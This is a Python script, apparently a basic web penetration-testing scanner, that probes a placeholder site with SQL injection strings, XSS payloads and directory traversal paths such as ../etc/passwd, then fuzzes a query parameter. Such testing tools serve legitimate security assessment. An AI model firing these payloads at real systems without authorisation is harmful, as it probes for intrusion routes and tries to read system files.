import requests
from urllib.parse import urljoin
import random
import string

# Define the base URL of the target web application
BASE_URL = 'http://example.com'

def send_request(url, params=None, cookies=None):
    try:
        response = requests.get(url, params=params, cookies=cookies)
        return response
    except requests.RequestException as e:
        print(f"Request error: {e}")
        return None

def test_sql_injection(url):
    print("Testing SQL Injection...")
    injection_points = ["' OR '1'='1", "'; --", "' OR 'a'='a", "' OR 1=1 --"]
    vulnerable = False

    for payload in injection_points:
        test_url = f"{url}?id={payload}"
        response = send_request(test_url)
        
        if response and ("SQL" in response.text or "sql" in response.text):
            print(f"SQL Injection vulnerability detected with payload: {payload}")
            vulnerable = True

    if not vulnerable:
        print("No SQL Injection vulnerability detected.")

def test_xss(url):
    print("Testing XSS...")
    xss_payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>"]
    vulnerable = False

    for payload in xss_payloads:
        test_url = f"{url}?q={payload}"
        response = send_request(test_url)
        
        if response and payload in response.text:
            print(f"XSS vulnerability detected with payload: {payload}")
            vulnerable = True

    if not vulnerable:
        print("No XSS vulnerability detected.")

def test_directory_traversal(url):
    print("Testing Directory Traversal...")
    traversal_payloads = ["../etc/passwd", "..\\..\\..\\..\\windows\\win.ini"]
    vulnerable = False

    for payload in traversal_payloads:
        test_url = f"{url}/{payload}"
        response = send_request(test_url)
        
        if response and ("root:x:" in response.text or "[extensions]" in response.text):
            print(f"Directory Traversal vulnerability detected with payload: {payload}")
            vulnerable = True

    if not vulnerable:
        print("No Directory Traversal vulnerability detected.")

def fuzz_input(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def fuzz_test(url, param):
    print(f"Fuzzing {param}...")
    for _ in range(100):  # Number of fuzzing attempts
        fuzz_data = fuzz_input()
        params = {param: fuzz_data}
        response = send_request(url, params=params)
        if response:
            print(f"Fuzz test with data {fuzz_data} resulted in status code {response.status_code}")

def main():
    print("Starting web penetration testing...")
    test_sql_injection(BASE_URL)
    test_xss(BASE_URL)
    test_directory_traversal(BASE_URL)
    fuzz_test(BASE_URL, 'q')  # Assuming 'q' is a query parameter to fuzz
    print("Testing completed.")

